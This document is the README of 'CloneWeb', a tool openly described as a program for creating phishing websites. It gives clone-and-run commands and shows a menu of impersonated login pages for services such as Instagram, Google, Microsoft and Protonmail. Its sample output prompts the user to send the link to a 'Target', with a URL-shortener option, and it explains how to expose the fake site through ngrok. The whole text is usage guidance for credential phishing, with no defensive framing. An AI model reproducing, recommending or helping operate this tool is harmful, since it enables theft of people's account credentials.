# CloneWeb
 Program for creating phishing websites!

## Requirements:
1. php
2. curl
3. ngrok

## Get Started:
```
git clone https://github.com/raunakrajadh/CloneWeb
cd CloneWeb
bash CloneWeb.sh
```
## Error: "No Target Link"
```
   #######  #######  ### ###  ### ###      #      ##    #  #######          #        #######  ##    #  ######
   #        #     #  #  #  #  #  #  #     # #     # #   #   #    #          #           #     # #   #  #     
   #        #     #  #     #  #     #    #####    #  #  #   #    #          #           #     #  #  #  ######
   #        #     #  #     #  #     #   #     #   #   # #   #    #          #           #     #   # #  #     
   #######  #######  #     #  #     #  #       #  #    ##  #######          #######  #######  #    ##  ######  v1.8

[01] Instagram      [09] Origin          [17] Gitlab
[02] Facebook       [10] Steam           [18] Pinterest
[03] Snapchat       [11] Yahoo           [19] Custom
[04] Twitter        [12] Linkedin        [99] Exit
[05] Github         [13] Protonmail
[06] Google         [14] Wordpress
[07] Spotify        [15] Microsoft
[08] Netflix        [16] InstaFollowers

[*] Choose an option: 1

[*] Starting php server...
[*] Starting ngrok server...
[*] Send this link to the Target:         (Link not found)

[*] Or using tinyurl: http://tinyurl.com/********

```
## Solution for Windows WLS or MAC/Linux
1. Exit CloneWeb
2. Download Ngrok - https://ngrok.com/download
3. Setup Ngrok through documentation.
4. The CloneWeb is hosted on `http://localhost:3333`
5. Use ngrok: `ngrok http 3333` to get a https url.
6. You can also use other services for port forwarding.
